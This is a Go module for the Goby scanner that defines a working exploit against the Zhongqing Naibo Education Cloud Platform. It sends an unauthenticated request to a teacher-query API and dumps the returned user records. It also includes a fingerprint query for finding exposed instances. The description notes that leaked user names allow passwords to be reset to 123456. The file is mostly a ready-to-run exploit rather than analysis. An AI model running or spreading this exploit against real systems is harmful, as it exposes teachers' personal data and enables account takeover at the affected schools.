package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "ZhongQing naibo Education Cloud Platform Information leakage",
  "Description": "Zhongqing Naboo education cloud platform system is a deep application that supports teaching and research.\\nInformation leakage and unauthorized access exist in the cloud platform system of Zhongqing Naboo Education.The password can be reset to 123456 through the leaked user name.",
  "Product": "Beijing Zhongqing Naboo Information Technology Co., Ltd. Zhongqing Naibo Education Cloud Platform System",
  "Homepage": "http://www.zqnb.com.cn",
  "DisclosureDate": "2021-07-09",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"中庆纳博\"",
  "Level": "3",
  "Impact": "<p style=\"text-align: justify;\">Information leakage is mainly caused by the negligence of developers or operation and maintenance management personnel. The attacker can further analyze the attack target through the information he/she has mastered, so as to effectively launch the next effective attack.</p><p style=\"text-align: justify;\">The application system does not carry out effective identity verification on the service function page. If the application system does not log in and knows the address of the service function page, it can directly operate the functions under the page, which may cause malicious damage to the application system</p>",
  "Recommandation": "<p style=\"text-align: justify;\">1. Delete the affected files to avoid information leakage.</p><p style=\"text-align: justify;\">2. Set up a unified error report page</p><p style=\"text-align: justify;\">3. Authorization of sensitive resources or information</p>",
  "References": [
    "https://www.pwnwiki.org/index.php?title=%E4%B8%AD%E6%85%B6%E7%B4%8D%E5%8D%9A%E6%95%99%E8%82%B2%E9%9B%B2%E5%B9%B3%E8%87%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%26%E6%9C%AA%E6%8E%88%E6%AC%8A%E8%A8%AA%E5%95%8F%E6%BC%8F%E6%B4%9E"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": " default",
      "type": "input",
      "value": " default",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "LoginName",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "UserAvatar",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "Disclosure of Sensitive Information"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}